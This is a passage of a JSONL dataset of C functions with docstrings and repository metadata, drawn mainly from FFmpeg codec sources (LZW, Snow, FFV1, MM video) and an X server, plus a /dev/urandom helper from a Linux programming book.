"perusio/linux-programming-by-example", "stars": 110, "license": "None", "language": "c", "size": 382}
{"docstring": "/* myrandom --- return data from /dev/urandom as unsigned long */\n", "func_signal": "unsigned long myrandom(void)", "code": "{\n\tstatic int fd = -1;\n\tunsigned long data;\n\n\tif (fd == -1)\n\t\tfd = open(\"/dev/urandom\", O_RDONLY);\n\n\tif (fd == -1 || read(fd, & data, sizeof data) <= 0)\n\t\treturn random();\t/* fall back */\n\n\treturn data;\n}", "path": "book\\ch12\\ch12-devrandom.c", "repo_name": "perusio/linux-programming-by-example", "stars": 110, "license": "None", "language": "c", "size": 382}
{"docstring": "/*\n * @param half_horiz Half horizontal resolution (0 or 1)\n * @param half_vert Half vertical resolution (0 or 1)\n */\n", "func_signal": "static void mm_decode_inter(MmContext * s, int half_horiz, int half_vert, const uint8_t *buf, int buf_size)", "code": "{\n    const int data_ptr = 2 + AV_RL16(&buf[0]);\n    int d, r, y;\n    d = data_ptr; r = 2; y = 0;\n\n    while(r < data_ptr) {\n        int i, j;\n        int length = buf[r] & 0x7f;\n        int x = buf[r+1] + ((buf[r] & 0x80) << 1);\n        r += 2;\n\n        if (length==0) {\n            y += x;\n            continue;\n        }\n\n        if (y + half_vert >= s->avctx->height)\n            return;\n\n        for(i=0; i<length; i++) {\n            for(j=0; j<8; j++) {\n                int replace = (buf[r+i] >> (7-j)) & 1;\n                if (replace) {\n                    int color = buf[d];\n                    s->frame.data[0][y*s->frame.linesize[0] + x] = color;\n                    if (half_horiz)\n                        s->frame.data[0][y*s->frame.linesize[0] + x + 1] = color;\n                    if (half_vert) {\n                        s->frame.data[0][(y+1)*s->frame.linesize[0] + x] = color;\n                        if (half_horiz)\n                            s->frame.data[0][(y+1)*s->frame.linesize[0] + x + 1] = color;\n                    }\n                    d++;\n                }\n                x += 1 + half_horiz;\n            }\n        }\n\n        r += length;\n        y += 1 + half_vert;\n    }\n}", "path": "jni\\ffmpeg\\libavcodec\\mmvideo.c", "repo_name": "xorange/Android-Video-Player-FFmpeg-and-Bitmap", "stars": 68, "license": "None", "language": "c", "size": 40104}
{"docstring": "/**\n * Find LZW code for block\n * @param s LZW state\n * @param c Last character in block\n * @param hash_prefix LZW code for prefix\n * @return LZW code for block or -1 if not found in table\n */\n", "func_signal": "static inline int findCode(LZWEncodeState * s, uint8_t c, int hash_prefix)", "code": "{\n    int h = hash(FFMAX(hash_prefix, 0), c);\n    int hash_offset = hashOffset(h);\n\n    while (s->tab[h].hash_prefix != LZW_PREFIX_FREE) {\n        if ((s->tab[h].suffix == c)\n            && (s->tab[h].hash_prefix == hash_prefix))\n            return h;\n        h = hashNext(h, hash_offset);\n    }\n\n    return h;\n}", "path": "jni\\ffmpeg\\libavcodec\\lzwenc.c", "repo_name": "xorange/Android-Video-Player-FFmpeg-and-Bitmap", "stars": 68, "license": "None", "language": "c", "size": 40104}
{"docstring": "/**\n * Write one code to stream\n * @param s LZW state\n * @param c code to write\n */\n", "func_signal": "static inline void writeCode(LZWEncodeState * s, int c)", "code": "{\n    assert(0 <= c && c < 1 << s->bits);\n    s->put_bits(&s->pb, s->bits, c);\n}", "path": "jni\\ffmpeg\\libavcodec\\lzwenc.c", "repo_name": "xorange/Android-Video-Player-FFmpeg-and-Bitmap", "stars": 68, "license": "None", "language": "c", "size": 40104}
{"docstring": "/**\n * Calculate number of bytes written\n * @param s LZW encode state\n * @return Number of bytes written\n */\n", "func_signal": "static int writtenBytes(LZWEncodeState *s)", "code": "{\n    int ret = put_bits_count(&s->pb) >> 3;\n    ret -= s->output_bytes;\n    s->output_bytes += ret;\n    return ret;\n}", "path": "jni\\ffmpeg\\libavcodec\\lzwenc.c", "repo_name": "xorange/Android-Video-Player-FFmpeg-and-Bitmap", "stars": 68, "license": "None", "language": "c", "size": 40104}
{"docstring": "/**\n * Clear LZW code table\n * @param s LZW state\n */\n", "func_signal": "static void clearTable(LZWEncodeState * s)", "code": "{\n    int i, h;\n\n    writeCode(s, s->clear_code);\n    s->bits = 9;\n    for (i = 0; i < LZW_HASH_SIZE; i++) {\n        s->tab[i].hash_prefix = LZW_PREFIX_FREE;\n    }\n    for (i = 0; i < 256; i++) {\n        h = hash(0, i);\n        s->tab[h].code = i;\n        s->tab[h].suffix = i;\n        s->tab[h].hash_prefix = LZW_PREFIX_EMPTY;\n    }\n    s->tabsize = 258;\n}", "path": "jni\\ffmpeg\\libavcodec\\lzwenc.c", "repo_name": "xorange/Android-Video-Player-FFmpeg-and-Bitmap", "stars": 68, "license": "None", "language": "c", "size": 40104}
{"docstring": "/**\n * LZW main compress function\n * @param s LZW state\n * @param inbuf Input buffer\n * @param insize Size of input buffer\n * @return Number of bytes written or -1 on error\n */\n", "func_signal": "int ff_lzw_encode(LZWEncodeState * s, const uint8_t * inbuf, int insize)", "code": "{\n    int i;\n\n    if(insize * 3 > (s->bufsize - s->output_bytes) * 2){\n        return -1;\n    }\n\n    if (s->last_code == LZW_PREFIX_EMPTY)\n        clearTable(s);\n\n    for (i = 0; i < insize; i++) {\n        uint8_t c = *inbuf++;\n        int code = findCode(s, c, s->last_code);\n        if (s->tab[code].hash_prefix == LZW_PREFIX_FREE) {\n            writeCode(s, s->last_code);\n            addCode(s, c, s->last_code, code);\n            code= hash(0, c);\n        }\n        s->last_code = s->tab[code].code;\n        if (s->tabsize >= s->maxcode - 1) {\n            clearTable(s);\n        }\n    }\n\n    return writtenBytes(s);\n}", "path": "jni\\ffmpeg\\libavcodec\\lzwenc.c", "repo_name": "xorange/Android-Video-Player-FFmpeg-and-Bitmap", "stars": 68, "license": "None", "language": "c", "size": 40104}
{"docstring": "//must be 1\n", "func_signal": "static int encode_q_branch(SnowContext *s, int level, int x, int y)", "code": "{\n    uint8_t p_buffer[1024];\n    uint8_t i_buffer[1024];\n    uint8_t p_state[sizeof(s->block_state)];\n    uint8_t i_state[sizeof(s->block_state)];\n    RangeCoder pc, ic;\n    uint8_t *pbbak= s->c.bytestream;\n    uint8_t *pbbak_start= s->c.bytestream_start;\n    int score, score2, iscore, i_len, p_len, block_s, sum, base_bits;\n    const int w= s->b_width  << s->block_max_depth;\n    const int h= s->b_height << s->block_max_depth;\n    const int rem_depth= s->block_max_depth - level;\n    const int index= (x + y*w) << rem_depth;\n    const int block_w= 1<<(LOG2_MB_SIZE - level);\n    int trx= (x+1)<<rem_depth;\n    int try= (y+1)<<rem_depth;\n    const BlockNode *left  = x ? &s->block[index-1] : &null_block;\n    const BlockNode *top   = y ? &s->block[index-w] : &null_block;\n    const BlockNode *right = trx<w ? &s->block[index+1] : &null_block;\n    const BlockNode *bottom= try<h ? &s->block[index+w] : &null_block;\n    const BlockNode *tl    = y && x ? &s->block[index-w-1] : left;\n    const BlockNode *tr    = y && trx<w && ((x&1)==0 || level==0) ? &s->block[index-w+(1<<rem_depth)] : tl; //FIXME use lt\n    int pl = left->color[0];\n    int pcb= left->color[1];\n    int pcr= left->color[2];\n    int pmx, pmy;\n    int mx=0, my=0;\n    int l,cr,cb;\n    const int stride= s->current_picture.linesize[0];\n    const int uvstride= s->current_picture.linesize[1];\n    uint8_t *current_data[3]= { s->input_picture.data[0] + (x + y*  stride)*block_w,\n                                s->input_picture.data[1] + (x + y*uvstride)*block_w/2,\n                                s->input_picture.data[2] + (x + y*uvstride)*block_w/2};\n    int P[10][2];\n    int16_t last_mv[3][2];\n    int qpel= !!(s->avctx->flags & CODEC_FLAG_QPEL); //unused\n    const int shift= 1+qpel;\n    MotionEstContext *c= &s->m.me;\n    int ref_context= av_log2(2*left->ref) + av_log2(2*top->ref);\n    int mx_context= av_log2(2*FFABS(left->mx - top->mx));\n    int my_context= av_log2(2*FFABS(left->my - top->my));\n    int s_context= 2*left->level + 2*top->level + tl->level + tr->level;\n    int ref, best_ref, ref_score, ref_mx, ref_my;\n\n    assert(sizeof(s->block_state) >= 256);\n    if(s->keyframe){\n        set_blocks(s, level, x, y, pl, pcb, pcr, 0, 0, 0, BLOCK_INTRA);\n        return 0;\n    }\n\n//    clip predictors / edge ?\n\n    P_LEFT[0]= left->mx;\n    P_LEFT[1]= left->my;\n    P_TOP [0]= top->mx;\n    P_TOP [1]= top->my;\n    P_TOPRIGHT[0]= tr->mx;\n    P_TOPRIGHT[1]= tr->my;\n\n    last_mv[0][0]= s->block[index].mx;\n    last_mv[0][1]= s->block[index].my;\n    last_mv[1][0]= right->mx;\n    last_mv[1][1]= right->my;\n    last_mv[2][0]= bottom->mx;\n    last_mv[2][1]= bottom->my;\n\n    s->m.mb_stride=2;\n    s->m.mb_x=\n    s->m.mb_y= 0;\n    c->skip= 0;\n\n    assert(c->  stride ==   stride);\n    assert(c->uvstride == uvstride);\n\n    c->penalty_factor    = get_penalty_factor(s->lambda, s->lambda2, c->avctx->me_cmp);\n    c->sub_penalty_factor= get_penalty_factor(s->lambda, s->lambda2, c->avctx->me_sub_cmp);\n    c->mb_penalty_factor = get_penalty_factor(s->lambda, s->lambda2, c->avctx->mb_cmp);\n    c->current_mv_penalty= c->mv_penalty[s->m.f_code=1] + MAX_MV;\n\n    c->xmin = - x*block_w - 16+3;\n    c->ymin = - y*block_w - 16+3;\n    c->xmax = - (x+1)*block_w + (w<<(LOG2_MB_SIZE - s->block_max_depth)) + 16-3;\n    c->ymax = - (y+1)*block_w + (h<<(LOG2_MB_SIZE - s->block_max_depth)) + 16-3;\n\n    if(P_LEFT[0]     > (c->xmax<<shift)) P_LEFT[0]    = (c->xmax<<shift);\n    if(P_LEFT[1]     > (c->ymax<<shift)) P_LEFT[1]    = (c->ymax<<shift);\n    if(P_TOP[0]      > (c->xmax<<shift)) P_TOP[0]     = (c->xmax<<shift);\n    if(P_TOP[1]      > (c->ymax<<shift)) P_TOP[1]     = (c->ymax<<shift);\n    if(P_TOPRIGHT[0] < (c->xmin<<shift)) P_TOPRIGHT[0]= (c->xmin<<shift);\n    if(P_TOPRIGHT[0] > (c->xmax<<shift)) P_TOPRIGHT[0]= (c->xmax<<shift); //due to pmx no clip\n    if(P_TOPRIGHT[1] > (c->ymax<<shift)) P_TOPRIGHT[1]= (c->ymax<<shift);\n\n    P_MEDIAN[0]= mid_pred(P_LEFT[0], P_TOP[0], P_TOPRIGHT[0]);\n    P_MEDIAN[1]= mid_pred(P_LEFT[1], P_TOP[1], P_TOPRIGHT[1]);\n\n    if (!y) {\n        c->pred_x= P_LEFT[0];\n        c->pred_y= P_LEFT[1];\n    } else {\n        c->pred_x = P_MEDIAN[0];\n        c->pred_y = P_MEDIAN[1];\n    }\n\n    score= INT_MAX;\n    best_ref= 0;\n    for(ref=0; ref<s->ref_frames; ref++){\n        init_ref(c, current_data, s->last_picture[ref].data, NULL, block_w*x, block_w*y, 0);\n\n        ref_score= ff_epzs_motion_search(&s->m, &ref_mx, &ref_my, P, 0, /*ref_index*/ 0, last_mv,\n                                         (1<<16)>>shift, level-LOG2_MB_SIZE+4, block_w);\n\n        assert(ref_mx >= c->xmin);\n        assert(ref_mx <= c->xmax);\n        assert(ref_my >= c->ymin);\n        assert(ref_my <= c->ymax);\n\n        ref_score= c->sub_motion_search(&s->m, &ref_mx, &ref_my, ref_score, 0, 0, level-LOG2_MB_SIZE+4, block_w);\n        ref_score= ff_get_mb_score(&s->m, ref_mx, ref_my, 0, 0, level-LOG2_MB_SIZE+4, block_w, 0);\n        ref_score+= 2*av_log2(2*ref)*c->penalty_factor;\n        if(s->ref_mvs[ref]){\n            s->ref_mvs[ref][index][0]= ref_mx;\n            s->ref_mvs[ref][index][1]= ref_my;\n            s->ref_scores[ref][index]= ref_score;\n        }\n        if(score > ref_score){\n            score= ref_score;\n            best_ref= ref;\n            mx= ref_mx;\n            my= ref_my;\n        }\n    }\n    //FIXME if mb_cmp != SSE then intra cannot be compared currently and mb_penalty vs. lambda2\n\n  //  subpel search\n    base_bits= get_rac_count(&s->c) - 8*(s->c.bytestream - s->c.bytestream_start);\n    pc= s->c;\n    pc.bytestream_start=\n    pc.bytestream= p_buffer; //FIXME end/start? and at the other stoo\n    memcpy(p_state, s->block_state, sizeof(s->block_state));\n\n    if(level!=s->block_max_depth)\n        put_rac(&pc, &p_state[4 + s_context], 1);\n    put_rac(&pc, &p_state[1 + left->type + top->type], 0);\n    if(s->ref_frames > 1)\n        put_symbol(&pc, &p_state[128 + 1024 + 32*ref_context], best_ref, 0);\n    pred_mv(s, &pmx, &pmy, best_ref, left, top, tr);\n    put_symbol(&pc, &p_state[128 + 32*(mx_context + 16*!!best_ref)], mx - pmx, 1);\n    put_symbol(&pc, &p_state[128 + 32*(my_context + 16*!!best_ref)], my - pmy, 1);\n    p_len= pc.bytestream - pc.bytestream_start;\n    score += (s->lambda2*(get_rac_count(&pc)-base_bits))>>FF_LAMBDA_SHIFT;\n\n    block_s= block_w*block_w;\n    sum = pix_sum(current_data[0], stride, block_w);\n    l= (sum + block_s/2)/block_s;\n    iscore = pix_norm1(current_data[0], stride, block_w) - 2*l*sum + l*l*block_s;\n\n    block_s= block_w*block_w>>2;\n    sum = pix_sum(current_data[1], uvstride, block_w>>1);\n    cb= (sum + block_s/2)/block_s;\n//    iscore += pix_norm1(&current_mb[1][0], uvstride, block_w>>1) - 2*cb*sum + cb*cb*block_s;\n    sum = pix_sum(current_data[2], uvstride, block_w>>1);\n    cr= (sum + block_s/2)/block_s;\n//    iscore += pix_norm1(&current_mb[2][0], uvstride, block_w>>1) - 2*cr*sum + cr*cr*block_s;\n\n    ic= s->c;\n    ic.bytestream_start=\n    ic.bytestream= i_buffer; //FIXME end/start? and at the other stoo\n    memcpy(i_state, s->block_state, sizeof(s->block_state));\n    if(level!=s->block_max_depth)\n        put_rac(&ic, &i_state[4 + s_context], 1);\n    put_rac(&ic, &i_state[1 + left->type + top->type], 1);\n    put_symbol(&ic, &i_state[32],  l-pl , 1);\n    put_symbol(&ic, &i_state[64], cb-pcb, 1);\n    put_symbol(&ic, &i_state[96], cr-pcr, 1);\n    i_len= ic.bytestream - ic.bytestream_start;\n    iscore += (s->lambda2*(get_rac_count(&ic)-base_bits))>>FF_LAMBDA_SHIFT;\n\n//    assert(score==256*256*256*64-1);\n    assert(iscore < 255*255*256 + s->lambda2*10);\n    assert(iscore >= 0);\n    assert(l>=0 && l<=255);\n    assert(pl>=0 && pl<=255);\n\n    if(level==0){\n        int varc= iscore >> 8;\n        int vard= score >> 8;\n        if (vard <= 64 || vard < varc)\n            c->scene_change_score+= ff_sqrt(vard) - ff_sqrt(varc);\n        else\n            c->scene_change_score+= s->m.qscale;\n    }\n\n    if(level!=s->block_max_depth){\n        put_rac(&s->c, &s->block_state[4 + s_context], 0);\n        score2 = encode_q_branch(s, level+1, 2*x+0, 2*y+0);\n        score2+= encode_q_branch(s, level+1, 2*x+1, 2*y+0);\n        score2+= encode_q_branch(s, level+1, 2*x+0, 2*y+1);\n        score2+= encode_q_branch(s, level+1, 2*x+1, 2*y+1);\n        score2+= s->lambda2>>FF_LAMBDA_SHIFT; //FIXME exact split overhead\n\n        if(score2 < score && score2 < iscore)\n            return score2;\n    }\n\n    if(iscore < score){\n        pred_mv(s, &pmx, &pmy, 0, left, top, tr);\n        memcpy(pbbak, i_buffer, i_len);\n        s->c= ic;\n        s->c.bytestream_start= pbbak_start;\n        s->c.bytestream= pbbak + i_len;\n        set_blocks(s, level, x, y, l, cb, cr, pmx, pmy, 0, BLOCK_INTRA);\n        memcpy(s->block_state, i_state, sizeof(s->block_state));\n        return iscore;\n    }else{\n        memcpy(pbbak, p_buffer, p_len);\n        s->c= pc;\n        s->c.bytestream_start= pbbak_start;\n        s->c.bytestream= pbbak + p_len;\n        set_blocks(s, level, x, y, pl, pcb, pcr, mx, my, best_ref, 0);\n        memcpy(s->block_state, p_state, sizeof(s->block_state));\n        return score;\n    }\n}", "path": "jni\\ffmpeg\\libavcodec\\snowenc.c", "repo_name": "xorange/Android-Video-Player-FFmpeg-and-Bitmap", "stars": 68, "license": "None", "language": "c", "size": 40104}
{"docstring": "/* CONFIG_FFV1_ENCODER */\n", "func_signal": "static av_cold int common_init(AVCodecContext *avctx)", "code": "{\n    FFV1Context *s = avctx->priv_data;\n\n    s->avctx= avctx;\n    s->flags= avctx->flags;\n\n    avcodec_get_frame_defaults(&s->picture);\n\n    dsputil_init(&s->dsp, avctx);\n\n    s->width = avctx->width;\n    s->height= avctx->height;\n\n    assert(s->width && s->height);\n    //defaults\n    s->num_h_slices=1;\n    s->num_v_slices=1;\n\n\n    return 0;\n}", "path": "jni\\ffmpeg\\libavcodec\\ffv1.c", "repo_name": "xorange/Android-Video-Player-FFmpeg-and-Bitmap", "stars": 68, "license": "None", "language": "c", "size": 40104}
{"docstring": "/**\n * Initialize LZW encoder. Please set s->clear_code, s->end_code and s->maxbits before run.\n * @param s LZW state\n * @param outbuf Output buffer\n * @param outsize Size of output buffer\n * @param maxbits Maximum length of code\n */\n", "func_signal": "void ff_lzw_encode_init(LZWEncodeState *s, uint8_t *outbuf, int outsize,\n                        int maxbits, enum FF_LZW_MODES mode,\n                        void (*lzw_put_bits)(PutBitContext *, int, unsigned))", "code": "{\n    s->clear_code = 256;\n    s->end_code = 257;\n    s->maxbits = maxbits;\n    init_put_bits(&s->pb, outbuf, outsize);\n    s->bufsize = outsize;\n    assert(s->maxbits >= 9 && s->maxbits <= LZW_MAXBITS);\n    s->maxcode = 1 << s->maxbits;\n    s->output_bytes = 0;\n    s->last_code = LZW_PREFIX_EMPTY;\n    s->bits = 9;\n    s->mode = mode;\n    s->put_bits = lzw_put_bits;\n}", "path": "jni\\ffmpeg\\libavcodec\\lzwenc.c", "repo_name": "xorange/Android-Video-Player-FFmpeg-and-Bitmap", "stars": 68, "license": "None", "language": "c", "size": 40104}
{"docstring": "//===========================================================================//\n", "func_signal": "static int query_format(struct vf_instance *vf, unsigned int fmt)", "code": "{\n        switch(fmt)\n        {\n        case IMGFMT_YV12:\n        case IMGFMT_I420:\n        case IMGFMT_IYUV:\n                return vf_next_query_format(vf,vf->priv->outfmt);\n        }\n        return 0;\n}", "path": "jni\\ffmpeg\\libavfilter\\libmpcodecs\\vf_noise.c", "repo_name": "xorange/Android-Video-Player-FFmpeg-and-Bitmap", "stars": 68, "license": "None", "language": "c", "size": 40104}
{"docstring": "/* CONFIG_FFV1_ENCODER */\n", "func_signal": "static void clear_state(FFV1Context *f)", "code": "{\n    int i, si, j;\n\n    for(si=0; si<f->slice_count; si++){\n        FFV1Context *fs= f->slice_context[si];\n        for(i=0; i<f->plane_count; i++){\n            PlaneContext *p= &fs->plane[i];\n\n            p->interlace_bit_state[0]= 128;\n            p->interlace_bit_state[1]= 128;\n\n            if(fs->ac){\n                if(f->initial_states[p->quant_table_index]){\n                    memcpy(p->state, f->initial_states[p->quant_table_index], CONTEXT_SIZE*p->context_count);\n                }else\n                memset(p->state, 128, CONTEXT_SIZE*p->context_count);\n            }else{\n            for(j=0; j<p->context_count; j++){\n                    p->vlc_state[j].drift= 0;\n                    p->vlc_state[j].error_sum= 4; //FFMAX((RANGE + 32)/64, 2);\n                    p->vlc_state[j].bias= 0;\n                    p->vlc_state[j].count= 1;\n            }\n            }\n        }\n    }\n}", "path": "jni\\ffmpeg\\libavcodec\\ffv1.c", "repo_name": "xorange/Android-Video-Player-FFmpeg-and-Bitmap", "stars": 68, "license": "None", "language": "c", "size": 40104}
{"docstring": "/**\n * Hash function calculates next hash value\n * @param head Actual hash code\n * @param offset Offset calculated by hashOffset\n * @return New hash value\n */\n", "func_signal": "static inline int hashNext(int head, const int offset)", "code": "{\n    head -= offset;\n    if(head < 0)\n        head += LZW_HASH_SIZE;\n    return head;\n}", "path": "jni\\ffmpeg\\libavcodec\\lzwenc.c", "repo_name": "xorange/Android-Video-Player-FFmpeg-and-Bitmap", "stars": 68, "license": "None", "language": "c", "size": 40104}
{"docstring": "/* special case for int[2] args we discard afterwards,\n * fixes compilation problem with gcc 2.95 */\n", "func_signal": "static av_always_inline int check_block_inter(SnowContext *s, int mb_x, int mb_y, int p0, int p1, const uint8_t *obmc_edged, int *best_rd)", "code": "{\n    int p[2] = {p0, p1};\n    return check_block(s, mb_x, mb_y, p, 0, obmc_edged, best_rd);\n}", "path": "jni\\ffmpeg\\libavcodec\\snowenc.c", "repo_name": "xorange/Android-Video-Player-FFmpeg-and-Bitmap", "stars": 68, "license": "None", "language": "c", "size": 40104}
{"docstring": "/**\n * Add block to LZW code table\n * @param s LZW state\n * @param c Last character in block\n * @param hash_prefix LZW code for prefix\n * @param hash_code LZW code for bytes block\n */\n", "func_signal": "static inline void addCode(LZWEncodeState * s, uint8_t c, int hash_prefix, int hash_code)", "code": "{\n    s->tab[hash_code].code = s->tabsize;\n    s->tab[hash_code].suffix = c;\n    s->tab[hash_code].hash_prefix = hash_prefix;\n\n    s->tabsize++;\n\n    if (s->tabsize >= (1 << s->bits) + (s->mode == FF_LZW_GIF))\n        s->bits++;\n}", "path": "jni\\ffmpeg\\libavcodec\\lzwenc.c", "repo_name": "xorange/Android-Video-Player-FFmpeg-and-Bitmap", "stars": 68, "license": "None", "language": "c", "size": 40104}
{"docstring": "/* CONFIG_FFV1_ENCODER */\n", "func_signal": "static av_cold int common_end(AVCodecContext *avctx)", "code": "{\n    FFV1Context *s = avctx->priv_data;\n    int i, j;\n\n    if (avctx->codec->decode && s->picture.data[0])\n        avctx->release_buffer(avctx, &s->picture);\n\n    for(j=0; j<s->slice_count; j++){\n        FFV1Context *fs= s->slice_context[j];\n        for(i=0; i<s->plane_count; i++){\n            PlaneContext *p= &fs->plane[i];\n\n            av_freep(&p->state);\n            av_freep(&p->vlc_state);\n        }\n        av_freep(&fs->sample_buffer);\n    }\n\n    av_freep(&avctx->stats_out);\n    for(j=0; j<s->quant_table_count; j++){\n        av_freep(&s->initial_states[j]);\n        for(i=0; i<s->slice_count; i++){\n            FFV1Context *sf= s->slice_context[i];\n            av_freep(&sf->rc_stat2[j]);\n        }\n        av_freep(&s->rc_stat2[j]);\n    }\n\n    for(i=0; i<s->slice_count; i++){\n        av_freep(&s->slice_context[i]);\n    }\n\n    return 0;\n}", "path": "jni\\ffmpeg\\libavcodec\\ffv1.c", "repo_name": "xorange/Android-Video-Player-FFmpeg-and-Bitmap", "stars": 68, "license": "None", "language": "c", "size": 40104}
{"docstring": "//near copy & paste from dsputil, FIXME\n", "func_signal": "static int pix_sum(uint8_t * pix, int line_size, int w)", "code": "{\n    int s, i, j;\n\n    s = 0;\n    for (i = 0; i < w; i++) {\n        for (j = 0; j < w; j++) {\n            s += pix[0];\n            pix ++;\n        }\n        pix += line_size - w;\n    }\n    return s;\n}", "path": "jni\\ffmpeg\\libavcodec\\snowenc.c", "repo_name": "xorange/Android-Video-Player-FFmpeg-and-Bitmap", "stars": 68, "license": "None", "language": "c", "size": 40104}
{"docstring": "/**\n * Hash function adding character\n * @param head LZW code for prefix\n * @param add Character to add\n * @return New hash value\n */\n", "func_signal": "static inline int hash(int head, const int add)", "code": "{\n    head ^= (add << LZW_HASH_SHIFT);\n    if (head >= LZW_HASH_SIZE)\n        head -= LZW_HASH_SIZE;\n    assert(head >= 0 && head < LZW_HASH_SIZE);\n    return head;\n}", "path": "jni\\ffmpeg\\libavcodec\\lzwenc.c", "repo_name": "xorange/Android-Video-Player-FFmpeg-and-Bitmap", "stars": 68, "license": "None", "language": "c", "size": 40104}
{"docstring": "//near copy & paste from dsputil, FIXME\n", "func_signal": "static int pix_norm1(uint8_t * pix, int line_size, int w)", "code": "{\n    int s, i, j;\n    uint32_t *sq = ff_squareTbl + 256;\n\n    s = 0;\n    for (i = 0; i < w; i++) {\n        for (j = 0; j < w; j ++) {\n            s += sq[pix[0]];\n            pix ++;\n        }\n        pix += line_size - w;\n    }\n    return s;\n}", "path": "jni\\ffmpeg\\libavcodec\\snowenc.c", "repo_name": "xorange/Android-Video-Player-FFmpeg-and-Bitmap", "stars": 68, "license": "None", "language": "c", "size": 40104}
{"docstring": "/* Ok currently the acceleration routine only supports\n   inputs of widths a multiple of 16\n   and heights a multiple 2\n\n   So we just fall back to the C codes for this.\n*/\n", "func_signal": "SwsFunc ff_yuv2rgb_init_altivec(SwsContext *c)", "code": "{\n    if (!(av_get_cpu_flags() & AV_CPU_FLAG_ALTIVEC))\n        return NULL;\n\n    /*\n      and this seems not to matter too much I tried a bunch of\n      videos with abnormal widths and MPlayer crashes elsewhere.\n      mplayer -vo x11 -rawvideo on:w=350:h=240 raw-350x240.eyuv\n      boom with X11 bad match.\n\n    */\n    if ((c->srcW & 0xf) != 0)    return NULL;\n\n    switch (c->srcFormat) {\n    case PIX_FMT_YUV410P:\n    case PIX_FMT_YUV420P:\n    /*case IMGFMT_CLPL:        ??? */\n    case PIX_FMT_GRAY8:\n    case PIX_FMT_NV12:\n    case PIX_FMT_NV21:\n        if ((c->srcH & 0x1) != 0)\n            return NULL;\n\n        switch(c->dstFormat) {\n        case PIX_FMT_RGB24:\n            av_log(c, AV_LOG_WARNING, \"ALTIVEC: Color Space RGB24\\n\");\n            return altivec_yuv2_rgb24;\n        case PIX_FMT_BGR24:\n            av_log(c, AV_LOG_WARNING, \"ALTIVEC: Color Space BGR24\\n\");\n            return altivec_yuv2_bgr24;\n        case PIX_FMT_ARGB:\n            av_log(c, AV_LOG_WARNING, \"ALTIVEC: Color Space ARGB\\n\");\n            return altivec_yuv2_argb;\n        case PIX_FMT_ABGR:\n            av_log(c, AV_LOG_WARNING, \"ALTIVEC: Color Space ABGR\\n\");\n            return altivec_yuv2_abgr;\n        case PIX_FMT_RGBA:\n            av_log(c, AV_LOG_WARNING, \"ALTIVEC: Color Space RGBA\\n\");\n            return altivec_yuv2_rgba;\n        case PIX_FMT_BGRA:\n            av_log(c, AV_LOG_WARNING, \"ALTIVEC: Color Space BGRA\\n\");\n            return altivec_yuv2_bgra;\n        default: return NULL;\n        }\n        break;\n\n    case PIX_FMT_UYVY422:\n        switch(c->dstFormat) {\n        case PIX_FMT_BGR32:\n            av_log(c, AV_LOG_WARNING, \"ALTIVEC: Color Space UYVY -> RGB32\\n\");\n            return altivec_uyvy_rgb32;\n        default: return NULL;\n        }\n        break;\n\n    }\n    return NULL;\n}", "path": "jni\\ffmpeg\\libswscale\\ppc\\yuv2rgb_altivec.c", "repo_name": "xorange/Android-Video-Player-FFmpeg-and-Bitmap", "stars": 68, "license": "None", "language": "c", "size": 40104}
{"docstring": "/**\n * @param half_horiz Half horizontal resolution (0 or 1)\n * @param half_vert Half vertical resolution (0 or 1)\n */\n", "func_signal": "static void mm_decode_intra(MmContext * s, int half_horiz, int half_vert, const uint8_t *buf, int buf_size)", "code": "{\n    int i, x, y;\n    i=0; x=0; y=0;\n\n    while(i<buf_size) {\n        int run_length, color;\n\n        if (y >= s->avctx->height)\n            return;\n\n        if (buf[i] & 0x80) {\n            run_length = 1;\n            color = buf[i];\n            i++;\n        }else{\n            run_length = (buf[i] & 0x7f) + 2;\n            color = buf[i+1];\n            i+=2;\n        }\n\n        if (half_horiz)\n            run_length *=2;\n\n        if (color) {\n            memset(s->frame.data[0] + y*s->frame.linesize[0] + x, color, run_length);\n            if (half_vert)\n                memset(s->frame.data[0] + (y+1)*s->frame.linesize[0] + x, color, run_length);\n        }\n        x+= run_length;\n\n        if (x >= s->avctx->width) {\n            x=0;\n            y += 1 + half_vert;\n        }\n    }\n}", "path": "jni\\ffmpeg\\libavcodec\\mmvideo.c", "repo_name": "xorange/Android-Video-Player-FFmpeg-and-Bitmap", "stars": 68, "license": "None", "language": "c", "size": 40104}
{"docstring": "/*\n * Spans functions; probably unused.\n */\n", "func_signal": "void\nfb24_32GetSpans(DrawablePtr\tpDrawable, \n\t\tint\t\twMax, \n\t\tDDXPointPtr\tppt, \n\t\tint\t\t*pwidth, \n\t\tint\t\tnspans, \n\t\tchar\t\t*pchardstStart)", "code": "{\n    FbBits\t    *srcBits;\n    CARD8\t    *src;\n    FbStride\t    srcStride;\n    int\t\t    srcBpp;\n    int\t\t    srcXoff, srcYoff;\n    CARD8\t    *dst;\n    \n    fbGetDrawable (pDrawable, srcBits, srcStride, srcBpp, srcXoff, srcYoff);\n    src = (CARD8 *) srcBits;\n    srcStride *= sizeof (FbBits);\n    \n    while (nspans--)\n    {\n\tdst = (CARD8 *) pchardstStart;\n\tfb24_32BltUp (src + (ppt->y + srcYoff) * srcStride, srcStride,\n\t\t      ppt->x + srcXoff,\n\t       \n\t\t      dst,\n\t\t      1,\n\t\t      0,\n\n\t\t      *pwidth,\n\t\t      1,\n\n\t\t      GXcopy,\n\t\t      FB_ALLONES);\n\t\n\tpchardstStart += PixmapBytePad(*pwidth, pDrawable->depth);\n\tppt++;\n\tpwidth++;\n    }\n}", "path": "fb\\fb24_32.c", "repo_name": "idunham/tinyxserver", "stars": 69, "license": "None", "language": "c", "size": 1728}
{"docstring": "/*\n * CheckExtension returns the extensions[] entry for the requested\n * extension name.  Maybe this could just return a Bool instead?\n */\n", "func_signal": "ExtensionEntry *\nCheckExtension(const char *extname)", "code": "{\n    int n;\n\n    n = FindExtension(extname, strlen(extname));\n    if (n != -1)\n\treturn extensions[n];\n    else\n\treturn NULL;\n}", "path": "dix\\extension.c", "repo_name": "idunham/tinyxserver", "stars": 69, "license": "None", "language": "c", "size": 1728}
